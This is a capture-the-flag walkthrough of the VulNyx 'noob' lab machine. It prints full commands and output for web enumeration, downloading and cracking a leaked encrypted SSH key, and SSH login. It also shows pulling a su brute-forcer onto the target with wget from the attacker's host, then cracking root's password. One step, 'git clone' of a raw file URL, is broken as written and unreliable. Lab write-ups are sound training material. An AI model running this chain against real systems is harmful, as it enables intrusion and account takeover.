# noob

## Executive Summary

| Machine | Author | Category | Platform |
| :--- | :--- | :--- | :--- |
| noob | m0w | Low | VulNyx |

**Summary:** The noob machine hid its secrets inside a classic mishap: a Vim editor recovery file. The web server served only the default Apache page, but Gobuster was run with swap file extensions such as `swp`, `swo`, and `~`, and it surfaced two telling artifacts in the web root. The first, `notes.txt`, was the rambling plea of an administrator named Diego, explaining that he had closed his editor by mistake while configuring SSH and lost the private key. The second, `id_rsa.swp`, was exactly that lost key, a leftover Vim swap file containing a passphrase encrypted RSA private key. The key was exfiltrated, converted with `ssh2john`, and cracked against rockyou in under a second, recovering the passphrase `sandiego`. That passphrase unlocked an SSH login as `diego` on the machine. From the low privilege shell, the readable `/etc/passwd` and the protected `/etc/shadow` confirmed that password hashes were out of reach, so the account database took a back seat. Instead, the `suForce` utility, a dedicated brute forcer for the `su` command, alongside the rockyou wordlist, was pulled onto the box and pointed at the root account. Within moments `su` flickered to `rootbeer` as the root password, and a single `su - root` delivered a root shell, making the whole compromise a chain of leaks and weak recovery.

---

## Reconnaissance

The session began with a host discovery sweep and a full port scan.

1. The target was identified at `192.168.56.113`:

```bash
┌──(kali㉿kali)-[~/nyx]
└─$ nmap -sn 192.168.56.0/24              
Starting Nmap 7.99 ( https://nmap.org ) at 2026-08-12 22:48 -0400
Nmap scan report for 192.168.56.1 (192.168.56.1)
Host is up (0.00060s latency).
MAC Address: 0A:00:27:00:00:00 (Unknown)
Nmap scan report for 192.168.56.100 (192.168.56.100)
Host is up (0.0010s latency).
MAC Address: 08:00:27:4D:BA:F2 (Oracle VirtualBox virtual NIC)
Nmap scan report for 192.168.56.113 (192.168.56.113)
Host is up (0.00069s latency).
MAC Address: 08:00:27:C3:1E:C0 (Oracle VirtualBox virtual NIC)
Nmap scan report for 192.168.56.104 (192.168.56.104)
Host is up.
Nmap done: 256 IP addresses (4 hosts up) scanned in 2.11 seconds

┌──(kali㉿kali)-[~/nyx]
└─$ ip=192.168.56.113
```

2. An aggressive full port scan revealed only two services:

```bash
┌──(kali㉿kali)-[~/nyx]
└─$ nmap -p- -T4 --min-rate=1000 -Pn $ip  
Starting Nmap 7.99 ( https://nmap.org ) at 2026-08-12 22:48 -0400
Nmap scan report for 192.168.56.113 (192.168.56.113)
Host is up (0.00084s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
MAC Address: 08:00:27:C3:1E:C0 (Oracle VirtualBox virtual NIC)

Nmap done: 1 IP address (1 host up) scanned in 2.77 seconds
```

3. Version and script detection characterized both services:

```bash
┌──(kali㉿kali)-[~/nyx]
└─$ nmap -p 22,80 -sC -sV -T4 -Pn $ip 
Starting Nmap 7.99 ( https://nmap.org ) at 2026-08-12 22:48 -0400
Nmap scan report for 192.168.56.113 (192.168.56.113)
Host is up (0.00036s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
| ssh-hostkey: 
|   3072 f0:e6:24:fb:9e:b0:7a:1a:bd:f7:b1:85:23:7f:b1:6f (RSA)
|   256 99:c8:74:31:45:10:58:b0:ce:cc:63:b4:7a:82:57:3d (ECDSA)
|_  256 60:da:3e:31:38:fa:b5:49:ab:48:c3:43:2c:9f:d1:32 (ED25519)
80/tcp open  http    Apache httpd 2.4.56 ((Debian))
|_http-title: Apache2 Debian Default Page: It works
|_http-server-header: Apache/2.4.56 (Debian)
MAC Address: 08:00:27:C3:1E:C0 (Oracle VirtualBox virtual NIC)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 7.27 seconds
```

SSH on port 22 and a stock Apache default page on port 80 were the only exposure. The web root became the focus for discovery since no credentials were available for SSH.

4. A Gobuster scan was run with editor artifact extensions included, on the theory that leftover files from text editors would reveal development or configuration mistakes:

```bash
┌──(kali㉿kali)-[~/nyx]
└─$ gobuster dir -u http://$ip/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt -x php,html,txt,swp,swo,~,save -b 403,404
===============================================================
Gobuster v3.8.2
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.56.113/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt
[+] Negative Status codes:   403,404
[+] User Agent:              gobuster/3.8.2
[+] Extensions:              swo,~,save,php,html,txt,swp
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
id_rsa.swp           (Status: 200) [Size: 1743]
index.html           (Status: 200) [Size: 10701]
notes.txt            (Status: 200) [Size: 101]
Progress: 38000 / 38000 (100.00%)
===============================================================
Finished
===============================================================
```

The two non-default hits were immediate leads: `notes.txt` and an SSH key that had leaked as a Vim swap file.

---

## Initial Access

### Reading the Administrator's Notes

5. The note left on the site was retrieved:

```bash
┌──(kali㉿kali)-[~/nyx]
└─$ curl -s http://$ip/notes.txt
Fuck!

configuring SSH, I closed the editor by mistake and lost the key.. I can't find it


Diego
```

The note, signed by Diego, confessed that an SSH key had been lost during a Vim session while configuring SSH. That explained the `id_rsa.swp` file perfectly: a swap file preserved by Vim after the editor was force-closed.

### Recovering the Lost SSH Key

6. The leaked swap file turned out to be the encrypted private key itself:

```bash
┌──(kali㉿kali)-[~/nyx]
└─$ curl -s http://$ip/id_rsa.swp
-----BEGIN RSA PRIVATE KEY-----
Proc-Type: 4,ENCRYPTED
DEK-Info: DES-EDE3-CBC,5FB6DAB10833FB47

wyx0cnQnbD8irngLK6O52ClihBJPTKpjbQdqfB/AbIlyBCtm0AAib5Ej6VH9UMKy
FEFFemgiN2Wpxz3vPq6RI470BL+2BXbqhO3yNGwCkmHiStWQ8AlhXdh+z5cP8xoT
/3wTzXQsCMT2sCwvOs2QoKXTEzd8RF6SqjD2ambSkzZMCoo+dYHw4+2PnbUiXr3s
VSJsNxiouNu9uUT+MpvKyfvpW1jfE/lcyEYWHFhllIjyLYqmZDEumhfMu3Q2ji7c
XjAuzgapP11+uSnzFLQo8DrSdmhmYJV+xYpKBiQLAZcsiwTzuyYz0CQhpVa7z9P6
rob+yzlwG/7erGjDb6wg/UJwDcjPn+T9mPrU0fZDF13iJNG9sE0OG80hd6QwPiFJ
mlW++fLEtYTC+wv56QiGPlDZn4yDziABRnRxYjHJnPvxZjpZFq+1hMc6OEyIst02
fN/C0Q6oZtYdLleb15/jhlX1gKH70L8a8ecmgmmYaS31kMdHwZinU8wHl4Pcrf88
We71WkrkFkuPlF2afLDehYSlJxeT2cJ+H9lGkEsfGL4JtoT4uyjsREiqC0Q3BlsD
7fA4t4k7quxq9q6A5YJQc8pDKWO6f/poDTBHxeK4Urzwh4gMjLWxuImTpvG3mydp
Z8FdMgO/AyWa7Zq8DACEZoDxY6IWwwJ2vcaSremVBlA2vkQqZsG1Df2wDlfF+/P0
PMUNDDshRx92IHnzinM+AM3HilxDKV1vwjMjOJJH1blb1sNIHUT85P90Ewn5NEgE
ACl3fK/GkOU9KX0gGfkXwmWqrFkeliTEhGpi7s9j5YSvbq4fTszxqt8UuM/gdTUf
7GPJCOe/h3oudznytN6j2N6Z15SOGG2j8+xUfgAbW/+IxuCdpVqGWESkTJ7VfbxR
sKq3U1AUm+fLrQ6T9+NIzHRuqts9EXUMkXjoDIsY56ZYU04oOezuvDzgy/GxVNeC
eLDEo8/IY77HjoQxP3a+AfEyFH26x4JVgF43RXSqdyGL62IqAjmdNnRM91XZJUY7
nNsnTyYDmQaAZLY2KQfiYQkUV4q6sGVmcwzM+ryTAIQJlmYbo+OCKZgg4ZxOjofM
axd1DhxHbC/Y2CdkB60N9fJdQSKqYjGPK7dDI/JBevrphp+p6ZMDeP8oERryI8mX
aLdVMWV3VcvR6Vs/x2/ogI6EBn1CA2VOooTtV77zKRHDcDlU2HmiOSRNCXvwLDi0
qPLJRBwSE+wwMgDAKsU+Yv5itHq7pCkeqzMbvD6E5kFyvHhXi2YmYj4EYPiz8OYP
dyw7aG8b8tICRoYRN3FjFH5kh1/PXWOf1TlbdHmYE6vNgpoBmrNNfEzT6zeZxKXj
ExJHVZ3v9+7rhPXUZasONogZrm9w9fOPSMFrVdNZsrZsrWAukfG+wCKVdzy5vAvL
bHefHgEM5ZC8v4+Kg7nsFjM6DHWn5y+lFb15TYptWApZ7+2UWHGhu3a1lZvxSFGi
iwEjHBlsCo8IBsRIRKrae6RpuQhVlm1fRZqf0yFuv2W2KjUGMqCinxn/7o7rY/d3
l5Ziei4zwDkhZTWB+iZtaJ7aSUJ6CKJb5sTta7HqSSgutGAX80Ao3g==
-----END RSA PRIVATE KEY-----
```

The `Proc-Type: 4, ENCRYPTED` header revealed a passphrase protected RSA key. Since the notes were signed by Diego, that key was likely his.

7. The key was saved, converted into a crackable hash, and cracked with John the Ripper:

```bash
┌──(kali㉿kali)-[~/nyx]
└─$ curl -s http://$ip/id_rsa.swp -o id_rsa

┌──(kali㉿kali)-[~/nyx]
└─$ ssh2john id_rsa > id_rsa.hash

┌──(kali㉿kali)-[~/nyx]
└─$ john --wordlist=/usr/share/wordlists/rockyou.txt id_rsa.hash
Using default input encoding: UTF-8
Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 1 for all loaded hashes
Cost 2 (iteration count) is 2 for all loaded hashes
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
sandiego         (id_rsa)     
1g 0:00:00:00 DONE (2026-08-12 23:00) 20.00g/s 63360p/s 63360c/s 63360C/s starbucks..heaven1
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
```

The passphrase `sandiego` was recovered immediately, a fitting nod to the owner's name.

8. The key was given strict permissions and used to log into SSH as `diego`:

```bash
┌──(kali㉿kali)-[~/nyx]
└─$ chmod 600 id_rsa      

┌──(kali㉿kali)-[~/nyx]
└─$ ssh -i id_rsa diego@$ip      
** WARNING: connection is not using a post-quantum key exchange algorithm.
** This session may be vulnerable to "store now, decrypt later" attacks.
** The server may need to be upgraded. See https://openssh.com/pq.html
Enter passphrase for key 'id_rsa': 
Linux noob 5.10.0-23-amd64 #1 SMP Debian 5.10.179-1 (2023-05-12) x86_64
Last login: Mon May 22 13:56:42 2023 from 192.168.1.10
diego@noob:~$ id;hostname
uid=1000(diego) gid=1000(diego) grupos=1000(diego)
noob
```

A shell existed on the machine as `diego`.

---

## Privilege Escalation

### Brute Forcing the Root Password with suForce

9. The account files were checked to gauge the available options:

```bash
diego@noob:~$ ls -la /etc/passwd /etc/shadow
-rw-r--r-- 1 root root   1391 may 22  2023 /etc/passwd
-rw-r----- 1 root shadow  874 may 22  2023 /etc/shadow
```

The shadow file was locked down to the `shadow` group, so hash cracking was not an option. The alternative was to brute force the `su` command itself against the root account.

10. The `suForce` utility, a dedicated brute forcer for `su`, was obtained from its repository:

```bash
┌──(kali㉿kali)-[~/nyx]
└─$ git clone https://raw.githubusercontent.com/d4t4s3c/suForce/main/suForce
```

Then both `suForce` and the rockyou wordlist were served to the target over HTTP:

```bash
┌──(kali㉿kali)-[/opt]
└─$ python3 -m http.server 1111
Serving HTTP on 0.0.0.0 port 1111 (http://0.0.0.0:1111/) ...
192.168.56.113 - - [12/Aug/2026 23:05:21] "GET /suForce HTTP/1.1" 200 -
^C
Keyboard interrupt received, exiting.

┌──(kali㉿kali)-[/opt]
└─$ cd /usr/share/wordlists 

┌──(kali㉿kali)-[/usr/share/wordlists]
└─$ python3 -m http.server 1111
Serving HTTP on 0.0.0.0 port 1111 (http://0.0.0.0:1111/) ...
192.168.56.113 - - [12/Aug/2026 23:05:41] "GET /rockyou.txt HTTP/1.1" 200 -
```

```bash
diego@noob:~$ wget http://192.168.56.104:1111/suForce
--2026-08-13 05:05:21--  http://192.168.56.104:1111/suForce
Conectando con 192.168.56.104:1111... conectado.
Petición HTTP enviada, esperando respuesta... 200 OK
Longitud: 2430 (2,4K) [application/octet-stream]
Grabando a: «suForce»

suForce                       100%[==============================================>]   2,37K  --.-KB/s    en 0s      

2026-08-13 05:05:21 (77,1 MB/s) - «suForce» guardado [2430/2430]

diego@noob:~$ wget http://192.168.56.104:1111/rockyou.txt
--2026-08-13 05:05:41--  http://192.168.56.104:1111/rockyou.txt
Conectando con 192.168.56.104:1111... conectado.
Petición HTTP enviada, esperando respuesta... 200 OK
Longitud: 139921507 (133M) [text/plain]
Grabando a: «rockyou.txt»

rockyou.txt                   100%[==============================================>] 133,44M  86,7MB/s    en 1,5s    

2026-08-13 05:05:42 (86,7 MB/s) - «rockyou.txt» guardado [139921507/139921507]
```

11. The brute force was launched against the root account:

```bash
diego@noob:~$ chmod +x suForce
diego@noob:~$ ./suForce -u root -w rockyou.txt 
            _____                          
 ___ _   _ |  ___|__  _ __ ___ ___   
/ __| | | || |_ / _ \| '__/ __/ _ \ 
\__ \ |_| ||  _| (_) | | | (_|  __/  
|___/\__,_||_|  \___/|_|  \___\___|  
───────────────────────────────────
 code: d4t4s3c     version: v1.0.0
───────────────────────────────────
🎯 Username | root
📖 Wordlist | rockyou.txt
🔎 Status   | 3267/14344392/0%/rootbeer
💥 Password | rootbeer
───────────────────────────────────
```

After a mere 3267 attempts, the root password crashed out of rockyou: `rootbeer`.

12. The recovered password was used to switch to root:

```bash
diego@noob:~$ su - root
Contraseña: 
root@noob:~# id;hostname
uid=0(root) gid=0(root) grupos=0(root)
noob
root@noob:~# cat /home/diego/user.txt /root/root.txt 
```

A single `su - root` with the recovered password produced a root shell, and both the user and root flags were read from it.

---

## Attack Chain Summary

1. **Reconnaissance**: A ping sweep isolated the target at `192.168.56.113`, and a full Nmap scan exposed only SSH on port 22 and Apache on port 80.

2. **Vulnerability Discovery**: A Gobuster scan running with editor artifact extensions surfaced `notes.txt` and `id_rsa.swp` in the web root. The notes, signed by Diego, admitted losing an SSH key during a Vim editing session.

3. **Exploitation**: The swap file contained the passphrase protected RSA key. Its hash was cracked with John the Ripper, recovering the passphrase `sandiego`, which unlocked an SSH login as `diego`.

4. **Internal Enumeration**: The account files confirmed that `/etc/shadow` was unreadable, ruling out hash cracking, so the `su` brute forcer `suForce` was transferred to the box together with the rockyou wordlist.

5. **Privilege Escalation**: `suForce` recovered the root password `rootbeer` after only a few thousand attempts. Running `su - root` granted a root shell, and both flags were retrieved.
